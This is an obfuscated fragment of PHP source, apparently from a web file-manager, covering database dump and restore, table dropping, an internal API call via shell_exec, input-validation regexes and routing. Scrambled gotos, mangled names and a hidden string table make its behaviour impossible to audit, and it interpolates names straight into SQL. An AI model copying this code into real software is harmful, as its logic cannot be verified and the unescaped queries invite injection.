$bÇª’¦İ’÷->execute("\163\x68\x6f\x77\40\144\x61\x74\141\142\141\163\145\163\40\154\x69\x6b\x65\40\x27{$F©–™¥„£}\x27"); goto C¥î—òÀğ; E©ö¾Ù–êŠ: $F©–™¥„£ = $Díƒç†Ê“Õ[$C¢ÌÃºÊæ[231]]; $Díƒç†Ê“Õ[$C¢ÌÃºÊæ[231]] = $C¢ÌÃºÊæ[33]; if ($Díƒç†Ê“Õ[$C¢ÌÃºÊæ[720]] == $C¢ÌÃºÊæ[721]) { $DµÉÀ¦Ø·÷ = $Díƒç†Ê“Õ[$C¢ÌÃºÊæ[723]]; $Díƒç†Ê“Õ[$C¢ÌÃºÊæ[723]] = substr($DµÉÀ¦Ø·÷, 0, strrpos($DµÉÀ¦Ø·÷, $C¢ÌÃºÊæ[1291])); } goto cˆÏÒ¤©ÎĞ; cÃ’–ÏÌ¯«: $C¢ÌÃºÊæ =& $_SERVER[ì‹É]; $Díƒç†Ê“Õ = $this->database; if ($this->type == $C¢ÌÃºÊæ[9] || !$Fé¦íù­øƒ) { return $this->model()->db(); } goto E©ö¾Ù–êŠ; A†Ë“†Àˆ: } public function createTable($bö ƒô»Ê, $fÄÑºˆµÈ’ = null) { $C÷èòáŞÍ =& $_SERVER[ì‹É]; if (!@file_exists($bö ƒô»Ê)) { show_json(LNG($C÷èòáŞÍ[1292]), !1); } $f‘Ôî÷ßà° = sqlSplit(file_get_contents($bö ƒô»Ê)); foreach ($f‘Ôî÷ßà° as $eÇ ¾š«ßò) { if ($fÄÑºˆµÈ’) { $CØĞ°œ = stripos($eÇ ¾š«ßò, $C÷èòáŞÍ[1293]) === 0; if ($CØĞ°œ) { $fÄÑºˆµÈ’->task[$C÷èòáŞÍ[1294]] += 1; } } $this->model()->db()->execute($eÇ ¾š«ßò); if ($fÄÑºˆµÈ’ && $CØĞ°œ) { $F¾ï®ïäâ¤ = $C÷èòáŞÍ[1295]; preg_match($F¾ï®ïäâ¤, $eÇ ¾š«ßò, $FÅÚóìŠ«Ç); $fÄÑºˆµÈ’->task[$C÷èòáŞÍ[1296]] = trim($E¢è¤´×ì×[0], $C÷èòáŞÍ[820]); $fÄÑºˆµÈ’->update(1); } } $this->taskToCache($fÄÑºˆµÈ’); } public function insertTable($Eîéßàƒ‰, $FŠ÷÷Çº¹Í = null) { $e•„¬ŠóŸˆ =& $_SERVER[ì‹É]; foreach ($Eîéßàƒ‰ as $Bó¯ø¹·Œç) { $FÅÙ±À·¢ = basename($Bó¯ø¹·Œç); $FÅÙ±À·¢ = substr($FÅÙ±À·¢, 0, strrpos($FÅÙ±À·¢, $e•„¬ŠóŸˆ[94])); if ($FŠ÷÷Çº¹Í) { $FŠ÷÷Çº¹Í->task[$e•„¬ŠóŸˆ[1296]] = $FÅÙ±À·¢; } if (get_filesize($Bó¯ø¹·Œç) == 0) { continue; } $C™òâÒËËÊ = $this->sqlToDb($Bó¯ø¹·Œç, $FŠ÷÷Çº¹Í); if (!$C™òâÒËËÊ) { show_json(LNG($e•„¬ŠóŸˆ[1297]) . "\x5b{$FÅÙ±À·¢}\135", !1); } } $this->taskToCache($FŠ÷÷Çº¹Í); } public function sqlFromDb($FêÚî¼¸ª°, $D›äğ¾›‰Š, $cˆŒã¶¸™ = null) { goto eÒ‡Û°ä; FğÏÉ„–’æ: do { $e°ÆßñŸ–÷ = $dÎêÉÃÒ¯Ô->field($Eçœ²¨è)->order($F´£…³¬ . $FŒ˜–àĞ–[708])->selectPage($dÓÁ¶»ç², $bÌˆí…Î¨ò); $c­ø› îæÆ = !empty($e°ÆßñŸ–÷[$FŒ˜–àĞ–[350]]) ? $e°ÆßñŸ–÷[$FŒ˜–àĞ–[350]] : array(); if (!($CÆÔ¢¹Öâ¹ = count($c­ø› îæÆ))) { break; } if ($cˆŒã¶¸™) { $cˆŒã¶¸™->task[$FŒ˜–àĞ–[1294]] += $CÆÔ¢¹Öâ¹; } $c£Â†ç°¯¬ = array(); foreach ($c­ø› îæÆ as $BÍ–ØßÒ) { $c£Â†ç°¯¬[] = $FŒ˜–àĞ–[711] . $this->sqlEncode($BÍ–ØßÒ) . $FŒ˜–àĞ–[712]; } $e†Ëè’ÆÏŠ = "\111\116\x53\x45\122\124\x20\111\116\124\x4f\40\x60{$FêÚî¼¸ª°}\x60\40\50\140" . implode($FŒ˜–àĞ–[713], $Eçœ²¨è) . $FŒ˜–àĞ–[714]; fwrite($EÚß²†Û‘Ç, $e†Ëè’ÆÏŠ . implode($FŒ˜–àĞ–[715], $c£Â†ç°¯¬) . $FŒ˜–àĞ–[68] . PHP_EOL); $bÌˆí…Î¨ò++; $fÛÍä¤Ë÷ += $CÆÔ¢¹Öâ¹; if ($cˆŒã¶¸™) { $cˆŒã¶¸™->update($CÆÔ¢¹Öâ¹); } } while ($CÆÔ¢¹Öâ¹ == $dÓÁ¶»ç²); fclose($EÚß²†Û‘Ç); return $fÛÍä¤Ë÷; goto f‰‘àŠïó; dİ±ŞèŒ†à: $fÛÍä¤Ë÷ = 0; $bÌˆí…Î¨ò = 1; $dÓÁ¶»ç² = 500; goto fôºÅÖˆ‰; eÒ‡Û°ä: $FŒ˜–àĞ– =& $_SERVER[ì‹É]; if ($cˆŒã¶¸™) { $cˆŒã¶¸™->task[$FŒ˜–àĞ–[1296]] = $FêÚî¼¸ª°; } $dÎêÉÃÒ¯Ô = $this->model($FêÚî¼¸ª°); goto dİ±ŞèŒ†à; fôºÅÖˆ‰: $EÚß²†Û‘Ç = fopen($D›äğ¾›‰Š, $FŒ˜–àĞ–[707]); $F´£…³¬ = $dÎêÉÃÒ¯Ô->getPk(); $Eçœ²¨è = $dÎêÉÃÒ¯Ô->getDbFields(); goto FğÏÉ„–’æ; f‰‘àŠïó: } public function sqlToDb($bÆ‘°İØÓ•, $bŒÜ½‰‡ÅØ = null) { goto C¿´è÷Ãô; EîğÈ‹ÏÔ: if (!$A¤ßÒ„ƒ¿“) { return !1; } $CŒ»™Ù‹×ë = 0; $D´›šöâÖ‡ = $F±‘ƒÜ®ëÔ[33]; goto AÔ¨á¶ÖİÃ; C¿´è÷Ãô: $F±‘ƒÜ®ëÔ =& $_SERVER[ì‹É]; $AùÍ«·ÎôÌ = $this->model()->db(); $A¤ßÒ„ƒ¿“ = @fopen($bÆ‘°İØÓ•, $F±‘ƒÜ®ëÔ[1298]); goto EîğÈ‹ÏÔ; C°ˆØƒÄˆ‘: if ($D´›šöâÖ‡) { $D´›šöâÖ‡ = rtrim($D´›šöâÖ‡, $F±‘ƒÜ®ëÔ[68]); if (!$AùÍ«·ÎôÌ->execute($D´›šöâÖ‡)) { return !1; } if ($bŒÜ½‰‡ÅØ) { $bŒÜ½‰‡ÅØ->update($CŒ»™Ù‹×ë - 1); } } return !0; goto d´ÈˆÛ”¡; AÔ¨á¶ÖİÃ: $Aå¸³†„“î = 500 + 1; while (!feof($A¤ßÒ„ƒ¿“)) { if ($bŒÜ½‰‡ÅØ && $CŒ»™Ù‹×ë != 0) { $bŒÜ½‰‡ÅØ->task[$F±‘ƒÜ®ëÔ[1294]] += 1; } $CŒ»™Ù‹×ë++; $Eî…á»³¼ì = trim(fgets($A¤ßÒ„ƒ¿“)); $D´›šöâÖ‡ .= $F±‘ƒÜ®ëÔ[50] . $this->sqlDecode($Eî…á»³¼ì, $this->type); if ($CŒ»™Ù‹×ë == $Aå¸³†„“î) { $D´›šöâÖ‡ = rtrim($D´›šöâÖ‡, $F±‘ƒÜ®ëÔ[68]); if (!$AùÍ«·ÎôÌ->execute($D´›šöâÖ‡)) { return !1; } if ($bŒÜ½‰‡ÅØ) { $bŒÜ½‰‡ÅØ->update($CŒ»™Ù‹×ë - 1); } $D´›šöâÖ‡ = $F±‘ƒÜ®ëÔ[33]; $CŒ»™Ù‹×ë = 0; } } fclose($A¤ßÒ„ƒ¿“); goto C°ˆØƒÄˆ‘; d´ÈˆÛ”¡: } public function dropTable($C‘°ï˜ë¨÷ = null) { $f‹–°­’âÂ = $this->model()->db(); $aÍâšù»Öã = $C‘°ï˜ë¨÷ ? array($C‘°ï˜ë¨÷) : $f‹–°­’âÂ->getTables(); if (!$aÍâšù»Öã) { return; } foreach ($aÍâšù»Öã as $C‘°ï˜ë¨÷) { $f‹–°­’âÂ->execute("\x64\x72\x6f\x70\x20\x74\x61\142\x6c\x65\40\x69\146\x20\145\x78\x69\163\164\x73\x20\x60{$C‘°ï˜ë¨÷}\140"); } } private function taskToCache($f‘Ì˜ˆ«Üğ = null) { $B­Ğ¤çõ =& $_SERVER[ì‹É]; if (!$f‘Ì˜ˆ«Üğ) { return; } $B‘´ãƒïñ = array($B­Ğ¤çõ[1296] => $f‘Ì˜ˆ«Üğ->task[$B­Ğ¤çõ[1296]], $B­Ğ¤çõ[1294] => $f‘Ì˜ˆ«Üğ->task[$B­Ğ¤çõ[1294]], $B­Ğ¤çõ[1299] => $f‘Ì˜ˆ«Üğ->task[$B­Ğ¤çõ[1299]]); if ($B‘´ãƒïñ[$B­Ğ¤çõ[1294]] == $B‘´ãƒïñ[$B­Ğ¤çõ[1299]]) { $B‘´ãƒïñ[$B­Ğ¤çõ[683]] = 1; } Cache::set($B­Ğ¤çõ[1300] . $f‘Ì˜ˆ«Üğ->task[$B­Ğ¤çõ[364]], $B‘´ãƒïñ); $f‘Ì˜ˆ«Üğ->end(); } private function sqlEncode($EòÛ”íêµ) { $CˆØ‡÷êÛÊ =& $_SERVER[ì‹É]; $d‰Øğºù˜‹ = array(); foreach ($EòÛ”íêµ as $FÕÕ›‰«Â¦) { if (is_array($FÕÕ›‰«Â¦)) { $FÕÕ›‰«Â¦ = json_encode_force($FÕÕ›‰«Â¦); } $FÕÕ›‰«Â¦ = addslashes($FÕÕ›‰«Â¦); $FÕÕ›‰«Â¦ = str_replace(array($CˆØ‡÷êÛÊ[716], $CˆØ‡÷êÛÊ[214]), array($CˆØ‡÷êÛÊ[717], $CˆØ‡÷êÛÊ[718]), $FÕÕ›‰«Â¦); $d‰Øğºù˜‹[] = str_replace($CˆØ‡÷êÛÊ[55], $CˆØ‡÷êÛÊ[1301], $FÕÕ›‰«Â¦); } return $CˆØ‡÷êÛÊ[55] . implode($CˆØ‡÷êÛÊ[719], $d‰Øğºù˜‹) . $CˆØ‡÷êÛÊ[55]; } private function sqlDecode($e¼Ë©¸à¯Œ, $d…ÃÉ£ï¾â) { $FõŸ’Ã°İ™ =& $_SERVER[ì‹É]; $e¼Ë©¸à¯Œ = str_replace(array($FõŸ’Ã°İ™[717], $FõŸ’Ã°İ™[718]), array($FõŸ’Ã°İ™[716], $FõŸ’Ã°İ™[214]), $e¼Ë©¸à¯Œ); if ($d…ÃÉ£ï¾â == $FõŸ’Ã°İ™[9]) { $e¼Ë©¸à¯Œ = stripslashes($e¼Ë©¸à¯Œ); } return $e¼Ë©¸à¯Œ; } } goto A™…ë¹æÀ; f°ÓÍÄÎŠ : function ActionCall($f†äØÆ±Å´) { $F»§‹ºê = array_slice(func_get_args(), 1); return ActionApply($f†äØÆ±Å´, $F»§‹ºê); } function ActionCallApi($BŒ£ğ‰ ÀÌ, $aäÒ£ƒó£ = '') { goto BôÓ¬©•ƒ±; fõ •ğà‡ó: return $bŞìë·À; goto cİí–ß¡İ; DŒïÄÁõÍ: $E¤»ö‡»¡ç = phpBinCommand(); if ($E¤»ö‡»¡ç && function_exists($d¢ƒã½Œœˆ[25])) { $EÅÎ”ßé¼ = $E¤»ö‡»¡ç . $d¢ƒã½Œœˆ[26] . BASIC_PATH . $d¢ƒã½Œœˆ[27] . escapeshellarg($BŒ£ğ‰ ÀÌ); $A»­ÊÁ“Õñ = shell_exec($EÅÎ”ßé¼); } if (!$A»­ÊÁ“Õñ) { $f´†‘·Á¦É = stream_context_create(array($d¢ƒã½Œœˆ[28] => array($d¢ƒã½Œœˆ[29] => 20, $d¢ƒã½Œœˆ[30] => $d¢ƒã½Œœˆ[31]))); $A»­ÊÁ“Õñ = file_get_contents(app_host_get() . $BŒ£ğ‰ ÀÌ, !1, $f´†‘·Á¦É); } goto AÌš•É‘; a‘œÙ­Î‚: $BŠÄ»½‡ƒ = Action($d¢ƒã½Œœˆ[23])->accessToken(); $BŒ£ğ‰ ÀÌ = str_replace($d¢ƒã½Œœˆ[5], $d¢ƒã½Œœˆ[4], $BŒ£ğ‰ ÀÌ) . $d¢ƒã½Œœˆ[24] . $BŠÄ»½‡ƒ . $a°¸ö—Ÿš“; $A»­ÊÁ“Õñ = $d¢ƒã½Œœˆ[20]; goto DŒïÄÁõÍ; AÌš•É‘: $cô÷Ÿßõºí = json_decode($A»­ÊÁ“Õñ, !0); $bŞìë·À = is_array($cô÷Ÿßõºí) ? $cô÷Ÿßõºí : array($d¢ƒã½Œœˆ[32] => null, $d¢ƒã½Œœˆ[33] => $A»­ÊÁ“Õñ); if (!$cô÷Ÿßõºí) { echo $A»­ÊÁ“Õñ; } goto fõ •ğà‡ó; BôÓ¬©•ƒ±: $d¢ƒã½Œœˆ =& $_SERVER[Ü›¼]; $a°¸ö—Ÿš“ = $aäÒ£ƒó£; if (is_array($aäÒ£ƒó£)) { $a°¸ö—Ÿš“ = $d¢ƒã½Œœˆ[20]; foreach ($aäÒ£ƒó£ as $E‹¢ß‰¾†Õ => $fôğãÖª’) { $fôğãÖª’ = is_array($fôğãÖª’) ? json_encode($fôğãÖª’) : $fôğãÖª’; $fôğãÖª’ = is_bool($fôğãÖª’) ? intval($fôğãÖª’) : $fôğãÖª’; $a°¸ö—Ÿš“ .= $d¢ƒã½Œœˆ[21] . $E‹¢ß‰¾†Õ . $d¢ƒã½Œœˆ[22] . rawurlencode($fôğãÖª’); } } goto a‘œÙ­Î‚; cİí–ß¡İ: } function ActionCallHook($b™…ÏÌÖ·¬) { goto A¯“³´¿Ó; eÉ…Œèãà·: $AÃÂ»£‰ö = $DëİÑ‡—¥Å ? json_decode($DëİÑ‡—¥Å, !0) : $AÃÂ»£‰ö; $GLOBALS[$CÙÙ©„›[34]] = 0; return $AÃÂ»£‰ö; goto dÈ÷ìÍµèø; A¯“³´¿Ó: $CÙÙ©„› =& $_SERVER[Ü›¼]; ob_start(); $D Ëæ¾ÎÓ = array_slice(func_get_args(), 1); goto aé×‡Ê„‰‹; aé×‡Ê„‰‹: $GLOBALS[$CÙÙ©„›[34]] = 1; $AÃÂ»£‰ö = ActionApply($b™…ÏÌÖ·¬, $D Ëæ¾ÎÓ); $DëİÑ‡—¥Å = ob_get_clean(); goto eÉ…Œèãà·; dÈ÷ìÍµèø: } goto EÉôÉÊ¢‰Á; AŠßˆèÊ§Œ: if (!function_exists($_SERVER[ì‹É][1782])) { define($_SERVER[ì‹É][1783], 0); define($_SERVER[ì‹É][1784], 1); define($_SERVER[ì‹É][1785], 2); function imageflip($Ağç¨®¤•ç, $B¢áÂ„ƒ¦) { switch ($B¢áÂ„ƒ¦) { case IMG_FLIP_HORIZONTAL: $d“ô¼Ÿ”â = imagesx($Ağç¨®¤•ç) - 1; $a·Ï‡²é¥ = $d“ô¼Ÿ”â / 2; $D†Ñ·ŞØèŠ = imagesy($Ağç¨®¤•ç); $dÎíÁóßÍŒ = imageistruecolor($Ağç¨®¤•ç) ? imagecreatetruecolor(1, $D†Ñ·ŞØèŠ) : imagecreate(1, $D†Ñ·ŞØèŠ); for ($e©¶„¸„ã• = 0; $e©¶„¸„ã• < $a·Ï‡²é¥; ++$e©¶„¸„ã•) { imagecopy($dÎíÁóßÍŒ, $Ağç¨®¤•ç, 0, 0, $e©¶„¸„ã•, 0, 1, $D†Ñ·ŞØèŠ); imagecopy($Ağç¨®¤•ç, $Ağç¨®¤•ç, $e©¶„¸„ã•, 0, $d“ô¼Ÿ”â - $e©¶„¸„ã•, 0, 1, $D†Ñ·ŞØèŠ); imagecopy($Ağç¨®¤•ç, $dÎíÁóßÍŒ, $d“ô¼Ÿ”â - $e©¶„¸„ã•, 0, 0, 0, 1, $D†Ñ·ŞØèŠ); } break; case IMG_FLIP_VERTICAL: $e¶£œ–ÛÆª = imagesx($Ağç¨®¤•ç); $E‘×ù¨¢Á = imagesy($Ağç¨®¤•ç) - 1; $D¡ä¨²ÓŒŒ = $E‘×ù¨¢Á / 2; $dÎíÁóßÍŒ = imageistruecolor($Ağç¨®¤•ç) ? imagecreatetruecolor($e¶£œ–ÛÆª, 1) : imagecreate($e¶£œ–ÛÆª, 1); for ($FÕÙ‹å™Ä = 0; $FÕÙ‹å™Ä < $D¡ä¨²ÓŒŒ; ++$FÕÙ‹å™Ä) { imagecopy($dÎíÁóßÍŒ, $Ağç¨®¤•ç, 0, 0, 0, $FÕÙ‹å™Ä, $e¶£œ–ÛÆª, 1); imagecopy($Ağç¨®¤•ç, $Ağç¨®¤•ç, 0, $FÕÙ‹å™Ä, 0, $E‘×ù¨¢Á - $FÕÙ‹å™Ä, $e¶£œ–ÛÆª, 1); imagecopy($Ağç¨®¤•ç, $dÎíÁóßÍŒ, 0, $E‘×ù¨¢Á - $FÕÙ‹å™Ä, 0, 0, $e¶£œ–ÛÆª, 1); } break; case IMG_FLIP_BOTH: $e¶£œ–ÛÆª = imagesx($Ağç¨®¤•ç); $D†Ñ·ŞØèŠ = imagesy($Ağç¨®¤•ç); $dÎíÁóßÍŒ = imagerotate($Ağç¨®¤•ç, 180, 0); imagecopy($Ağç¨®¤•ç, $dÎíÁóßÍŒ, 0, 0, 0, 0, $e¶£œ–ÛÆª, $D†Ñ·ŞØèŠ); break; default: return; } imagedestroy($dÎíÁóßÍŒ); } } if (!function_exists($_SERVER[ì‹É][1786])) { function imagecreatefrombmp($CÖÙŠØˆ¥) { return ImageGdBMP::load($CÖÙŠØˆ¥); } } class Input { public static function getArray($E³•×éÔ) { goto C¤İ•«–š; B˜‚×î¼ƒ‚: if (count($dÎ£åÑ¡ÖÅ) > 0) { show_json(implode($e§××¥¬¢›[1792], $dÎ£åÑ¡ÖÅ), !1); } return $c¦´Ì‡ë¯²; goto F¾ÛÅ¶ßÉª; C¤İ•«–š: $e§××¥¬¢› =& $_SERVER[ì‹É]; global $in; $c¦´Ì‡ë¯² = array(); goto f”¤õÍ•Çİ; f”¤õÍ•Çİ: $dÎ£åÑ¡ÖÅ = array(); $cÎ‚ÚÕ¿Ô = LNG($e§××¥¬¢›[1787]); foreach ($E³•×éÔ as $B§¥‚ö¯ => $c‚Õí‚Òµ½) { goto fŞ©§ï®¢Ä; fŞ©§ï®¢Ä: $cå‹í¾¾¶ù = _get($c‚Õí‚Òµ½, $e§××¥¬¢›[1788], $cÎ‚ÚÕ¿Ô . $e§××¥¬¢›[877] . $B§¥‚ö¯); $Fƒ¤åè¤ë£ = $B§¥‚ö¯; if (isset($c‚Õí‚Òµ½[$e§××¥¬¢›[1789]]) && $c‚Õí‚Òµ½[$e§××¥¬¢›[1789]]) { $Fƒ¤åè¤ë£ = $c‚Õí‚Òµ½[$e§××¥¬¢›[1789]]; } goto EÉŒÊ±¨¹˜; EÉŒÊ±¨¹˜: if (!array_key_exists($B§¥‚ö¯, $in)) { if (array_key_exists($e§××¥¬¢›[1790], $c‚Õí‚Òµ½)) { if (!is_null($c‚Õí‚Òµ½[$e§××¥¬¢›[1790]])) { $c¦´Ì‡ë¯²[$Fƒ¤åè¤ë£] = $c‚Õí‚Òµ½[$e§××¥¬¢›[1790]]; } } else { if (isset($c‚Õí‚Òµ½[$e§××¥¬¢›[1791]])) { $dÎ£åÑ¡ÖÅ[] = $cå‹í¾¾¶ù; } } continue; } if (isset($c‚Õí‚Òµ½[$e§××¥¬¢›[1791]]) && $c‚Õí‚Òµ½[$e§××¥¬¢›[1791]] == $e§××¥¬¢›[279]) { $Dæ‚œÓ•²¬ = json_decode($in[$B§¥‚ö¯], !0); if (is_array($Dæ‚œÓ•²¬)) { $c¦´Ì‡ë¯²[$Fƒ¤åè¤ë£] = $Dæ‚œÓ•²¬; } else { if (array_key_exists($e§××¥¬¢›[1790], $c‚Õí‚Òµ½)) { if (!is_null($c‚Õí‚Òµ½[$e§××¥¬¢›[1790]])) { $c¦´Ì‡ë¯²[$Fƒ¤åè¤ë£] = $c‚Õí‚Òµ½[$e§××¥¬¢›[1790]]; } } else { $dÎ£åÑ¡ÖÅ[] = $cå‹í¾¾¶ù; } } continue; } $AØ’ÊŸ½«Ò = _get($c‚Õí‚Òµ½, $e§××¥¬¢›[984]); goto f©´‚Â¨¬·; f©´‚Â¨¬·: if (isset($c‚Õí‚Òµ½[$e§××¥¬¢›[1791]]) && !self::check($in[$B§¥‚ö¯], $c‚Õí‚Òµ½[$e§××¥¬¢›[1791]], $AØ’ÊŸ½«Ò)) { if (array_key_exists($e§××¥¬¢›[1790], $c‚Õí‚Òµ½)) { if (!is_null($c‚Õí‚Òµ½[$e§××¥¬¢›[1790]])) { $c¦´Ì‡ë¯²[$Fƒ¤åè¤ë£] = $c‚Õí‚Òµ½[$e§××¥¬¢›[1790]]; } } else { $dÎ£åÑ¡ÖÅ[] = $cå‹í¾¾¶ù; } continue; } $c¦´Ì‡ë¯²[$Fƒ¤åè¤ë£] = $in[$B§¥‚ö¯]; goto f§Ê±¹ØÔ‚; f§Ê±¹ØÔ‚: } goto B˜‚×î¼ƒ‚; F¾ÛÅ¶ßÉª: } public static function reg($E¼¬¤‰îÌñ = "\x72\x65\x71\x75\151\x72\x65") { static $EÅ¥ÈÉğ = array("\x72\x65\x71\165\151\162\145" => "\56\x2b", "\x6e\165\155\x62\145\x72" => "\x5c\x64\x2b", "\x68\x65\170" => "\133\x30\x2d\71\x41\55\106\x61\x2d\x66\x5d\x2b", "\x69\156\x74" => "\x5b\x2d\x5c\53\135\77\134\144\53", "\x62\x6f\157\x6c" => "\x30\174\61", "\x66\x6c\157\141\164" => "\133\55\134\53\x5d\77\x5c\x64\x2b\x28\x5c\x2e\x5c\x64\x2b\51\x3f", "\145\x6e\147\x6c\x69\x73\150" => "\133\x41\x2d\x5a\141\x2d\172\x20\135\53", "\x63\x68\x69\156\x65\163\x65" => "\x5b\x5c\x78\x7b\64\145\x30\x30\x7d\55\134\x78\x7b\71\146\141\65\175\x5d\53", "\x68\x61\163\x43\150\x69\x6e\145\163\145" => "\x2f\x28\x5b\x5c\x78\x7b\x34\x65\60\x30\x7d\55\x5c\x78\173\x39\x66\141\x35\175\x5d\53\x29\x2f\x75", "\145\155\141\151\x6c" => "\134\167\x2b\x28\133\134\56\x5c\x2d\x5d\x5c\x77\x2b\51\52\x5c\x40\x5c\x77\53\50\x5b\134\x2e\x5c\55\x5d\x5c\x77\x2b\x29\x2a\x5c\56\134\x77\x2b", "\x70\150\157\156\145" => "\x31\133\63\x2d\71\135\134\144\x7b\x39\x7d", "\x74\145\x6c\x70\150\157\x6e\145" => "\x28\134\x28\x5c\144\173\x33\54\64\x7d\134\x29\x7c\134\x64\173\x33\x2c\64\x7d\55\174\134\x73\51\77\x5c\x64\x7b\67\54\61\64\x7d", "\165\x72\154" => "\x28\150\x74\x74\x70\x7c\x66\x74\x70\x7c\150\x74\x74\160\163\x29\72\134\x2f\x5c\57\133\134\x77\134\x2d\x5f\x5d\x2b\50\134\x2e\x5b\134\x77\x5c\55\137\135\53\x29\53\50\133\134\x77\x5c\x2d\134\56\x2c\100\77\136\x3d\x25\46\x3a\134\x2f\176\x5c\53\43\135\52\x5b\x5c\167\x5c\x2d\x5c\x40\77\x5e\x3d\45\x26\x5c\x2f\176\x5c\x2b\x23\x5d\51\x3f", "\165\162\x6c\x46\165\154\x6c" => "\133\x61\x2d\172\x41\x2d\x7a\x5d\53\72\x5c\x2f\x5c\57\x5b\136\134\163\x5d\x2a", "\x69\160" => "\50\x5c\144\x7b\x31\54\63\175\x5c\56\x29\173\63\x7d\50\134\x64\173\61\54\63\x7d\51", "\172\x69\160" => "\133\61\x2d\x39\x5d\x5c\144\x7b\65\175\x28\x3f\41\134\144\x29", "\151\x64\x43\x61\x72\144" => "\x28\x5c\x64\173\61\x35\175\x29\174\x28\x5c\x64\x7b\x31\x37\175\50\x5c\144\x7c\x58\x7c\x78\x29\51", "\x63\x6f\x6c\x6f\162" => "\x23\50\x5b\x30\x2d\x39\101\x2d\106\141\x2d\146\x5d\x7b\63\x7d\174\133\x30\x2d\x39\101\x2d\106\x61\x2d\x66\135\173\66\x7d\51", "\x74\x69\x6d\x65" => "\x28\133\x30\55\x31\135\x5c\x64\174\x32\x5b\x30\x2d\64\135\x29\x3a\133\x30\x2d\65\135\x5c\144", "\144\141\164\145" => "\x5c\x64\x7b\64\x7d\133\55\134\57\x5d\x3f\50\x30\133\x31\x2d\71\x5d\x7c\61\133\60\x2d\x32\135\x29\x5b\x2d\134\57\135\77\50\133\60\55\x32\x5d\x5c\144\x7c\63\x5b\x30\x2d\61\135\51", "\144\141\x74\145\x54\151\x6d\145" => "\134\144\x7b\x34\175\133\x2d\134\x2f\135\77\x28\60\133\x31\x2d\71\x5d\174\61\x5b\x30\x2d\62\135\51\133\x2d\134\x2f\135\77\x28\x5b\60\55\x32\135\x5c\x64\174\x33\133\x30\x2d\61\x5d\x29\x5c\x73\53\50\133\60\55\61\x5d\134\144\174\62\x5b\x30\55\64\135\51\x3a\x5b\x30\x2d\65\x5d\134\144", "\x70\x61\x73\x73\x77\x6f\x72\x64" => "\50\77\x3d\56\x2a\134\144\x29\x28\x3f\x3d\56\52\133\x61\55\x7a\x5d\51\50\x3f\75\x2e\x2a\133\x41\55\132\135\51\x2e\173\x38\x2c\x32\x30\175", "\x6b\145\x79" => "\x5b\x41\x2d\x5a\141\x2d\x7a\x30\x2d\71\x5f\x5c\x2d\x5c\56\135\53", "\153\x65\171\x46\x75\154\x6c" => "\133\101\x2d\132\141\x2d\x7a\60\x2d\x39\137\x5c\55\134\56\134\x73\x2c\135\x2b"); if (!$E¼¬¤‰îÌñ) { return $EÅ¥ÈÉğ; } return $EÅ¥ÈÉğ[$E¼¬¤‰îÌñ]; } public static function check($D¬ÂÛ™£¢¡, $Fê ¢Í¼Á¾, $b½Ô™Û†° = null) { $cÌìœ›‘øé =& $_SERVER[ì‹É]; switch ($Fê ¢Í¼Á¾) { case $cÌìœ›‘øé[7]: return in_array($D¬ÂÛ™£¢¡, $b½Ô™Û†°); break; case $cÌìœ›‘øé[1793]: return floatval($D¬ÂÛ™£¢¡) > $b½Ô™Û†°; break; case $cÌìœ›‘øé[1794]: return floatval($D¬ÂÛ™£¢¡) < $b½Ô™Û†°; break; case $cÌìœ›‘øé[322]: return strlen($D¬ÂÛ™£¢¡) >= $b½Ô™Û†°[0] && strlen($D¬ÂÛ™£¢¡) <= $b½Ô™Û†°[1]; break; case $cÌìœ›‘øé[322]: if (is_array($b½Ô™Û†°)) { return strlen($D¬ÂÛ™£¢¡) >= $b½Ô™Û†°[0] && strlen($D¬ÂÛ™£¢¡) <= $b½Ô™Û†°[1]; break; } else { return strlen($D¬ÂÛ™£¢¡) == $b½Ô™Û†°; break; } case $cÌìœ›‘øé[318]: return floatval($D¬ÂÛ™£¢¡) >= $b½Ô™Û†°[0] && floatval($D¬ÂÛ™£¢¡) <= $b½Ô™Û†°[1]; break; } $eù¨‘¨Ü‚ = self::reg(!1); $Fê ¢Í¼Á¾ = isset($eù¨‘¨Ü‚[$Fê ¢Í¼Á¾]) ? $eù¨‘¨Ü‚[$Fê ¢Í¼Á¾] : $Fê ¢Í¼Á¾; if (substr($Fê ¢Í¼Á¾, 0, 1) != $cÌìœ›‘øé[8]) { $Fê ¢Í¼Á¾ = $cÌìœ›‘øé[1795] . $Fê ¢Í¼Á¾ . $cÌìœ›‘øé[1796]; } return preg_match($Fê ¢Í¼Á¾, $D¬ÂÛ™£¢¡) === 1; } public static function get($AÈÍæ‰„Çƒ, $D•”¥¤‰ÖÙ = null, $c´¢Î‰ß…Å = null, $AÎîö¬ˆ = null) { goto cŠ‡Èßøà; cŠ‡Èßøà: $dÀğøƒİì =& $_SERVER[ì‹É]; $AÙÎÍ³™ÃË = array(); if (!is_null($c´¢Î‰ß…Å)) { $AÙÎÍ³™ÃË[$dÀğøƒİì[34]] = $c´¢Î‰ß…Å; } goto bÑôã•†¹; A¤ùç‘åéê: return $E˜÷ÏÉ•˜™[$AÈÍæ‰„Çƒ]; goto F‘¥­šäÒÔ; bÑôã•†¹: if (!is_null($AÎîö¬ˆ)) { $AÙÎÍ³™ÃË[$dÀğøƒİì[984]] = $AÎîö¬ˆ; } if (!is_null($D•”¥¤‰ÖÙ)) { $AÙÎÍ³™ÃË[$dÀğøƒİì[1791]] = $D•”¥¤‰ÖÙ; } $E˜÷ÏÉ•˜™ = Input::getArray(array($AÈÍæ‰„Çƒ => $AÙÎÍ³™ÃË)); goto A¤ùç‘åéê; F‘¥­šäÒÔ: } } goto Aù¯×“à‹š; A™…ë¹æÀ: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\141\x6e\x79" => "\x5b\136\x2f\135\53", "\x3a\156\165\155" => "\x5b\60\x2d\71\x5d\53", "\x3a\141\154\154" => "\x2e\x2a"); public static $errorCallback; public static function __callstatic($D«øç¸‹–, $Bİõ–«†‡) { $fÙùËÇºæÖ =& $_SERVER[ì‹É]; if ($D«øç¸‹– == $fÙùËÇºæÖ[1302]) { $dù¯˜°íÁ = array_map($fÙùËÇºæÖ[1303], $Bİõ–«†‡[0]); $bÖÈÑÄ£¾ƒ = strpos($Bİõ–«†‡[1], $fÙùËÇºæÖ[8]) === 0 ? $Bİõ–«†‡[1] : $fÙùËÇºæÖ[8] . $Bİõ–«†‡[1]; $FÛ¥íŒ…ö› = $Bİõ–«†‡[2]; } else { $dù¯˜°íÁ = null; $bÖÈÑÄ£¾ƒ = strpos($Bİõ–«†‡[0], $fÙùËÇºæÖ[8]) === 0 ? 